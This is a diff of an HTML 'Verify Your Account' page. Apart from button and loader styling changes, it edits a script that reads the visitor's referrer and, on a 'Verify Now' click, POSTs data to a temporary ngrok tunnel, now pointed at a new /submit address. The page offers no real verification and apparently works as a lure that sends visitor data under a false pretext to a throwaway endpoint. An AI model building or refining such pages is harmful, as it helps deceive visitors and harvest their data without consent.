@@ -42,7 +42,6 @@
             font-size: 1rem;
             cursor: pointer;
             transition: background-color 0.3s ease;
-            width: 100%; /* Ensure the button takes full width */
         }
         button:hover {
             background-color: #0056b3;
@@ -73,32 +72,14 @@
         .error {
             color: #dc3545;
         }
-        .button-container {
-            position: relative;
-            width: 100%;
-        }
-        .button-container button {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-        }
-        .button-container .loader {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Verify Your Account</h1>
         <p>Click the button below to complete the verification process.</p>
-        <div class="button-container">
-            <button id="verifyButton">Verify Now</button>
-            <div class="loader" id="loader"></div>
-        </div>
+        <button id="verifyButton">Verify Now</button>
+        <div class="loader" id="loader"></div>
         <div class="message" id="message"></div>
     </div>
 
@@ -110,12 +91,12 @@
             const referrer = document.referrer;
 
             // Show loader and hide button
-            document.getElementById('verifyButton').style.opacity = '0';
+            document.getElementById('verifyButton').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
             try {
                 // Send data to your backend
-                const response = await fetch('https://b05a-2a02-8084-e80-3400-d57b-e023-b06b-cbaa.ngrok-free.app', {
+                const response = await fetch('https://3a00-2a02-8084-e80-3400-d57b-e023-b06b-cbaa.ngrok-free.app/submit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -137,7 +118,7 @@
                 // Show error message
                 document.getElementById('message').innerHTML = `<p class="error">Error: ${error.message}. Please try again.</p>`;
                 // Show button again
-                document.getElementById('verifyButton').style.opacity = '1';
+                document.getElementById('verifyButton').style.display = 'block';
             } finally {
                 // Hide loader
                 document.getElementById('loader').style.display = 'none';
